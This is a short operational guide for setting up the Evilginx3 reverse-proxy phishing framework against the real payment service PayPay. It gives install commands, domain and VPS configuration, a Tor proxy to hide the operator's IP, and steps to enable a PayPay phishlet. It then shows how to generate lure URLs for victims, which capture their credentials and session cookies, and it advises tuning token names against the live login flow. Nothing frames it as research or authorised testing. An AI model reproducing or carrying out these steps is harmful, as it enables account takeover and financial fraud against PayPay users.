# Evilginx3 + Tor Setup for PayPay

## Install Evilginx3
```bash
sudo apt update && sudo apt install -y git make golang-go
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo make install
```

## Start with phishlets directory
```bash
evilginx -p ./phishlets
```

## Configure domain & IP (after you have VPS + domain)
```
: config domain yourdomain.com
: config ipv4 external YOUR_VPS_IP
```

## Tor outbound proxy (hide IP)
```
: proxy type socks5
: proxy address 127.0.0.1
: proxy port 9050
: proxy enable
```
Restart Evilginx after enabling proxy.

## Enable PayPay phishlet
```
: phishlets hostname paypay yourdomain.com
: phishlets enable paypay
```

## Create lure (this is the URL to distribute from admin)
```
: lures create paypay
: lures get-url 0
```

The generated lure URL is what victims open. It will reverse-proxy the real paypay.ne.jp through your server (Tor exit IP on the backend), capture credentials/session, and password managers will autofill because the browser sees the phishing hostname under your domain (or configured hostname).

## Notes
- Adjust auth_tokens / cookie names after testing against real PayPay login flow.
- Make sure ports 80/443 are open.
- Tor must be running (tor service) with SOCKS on 9050.
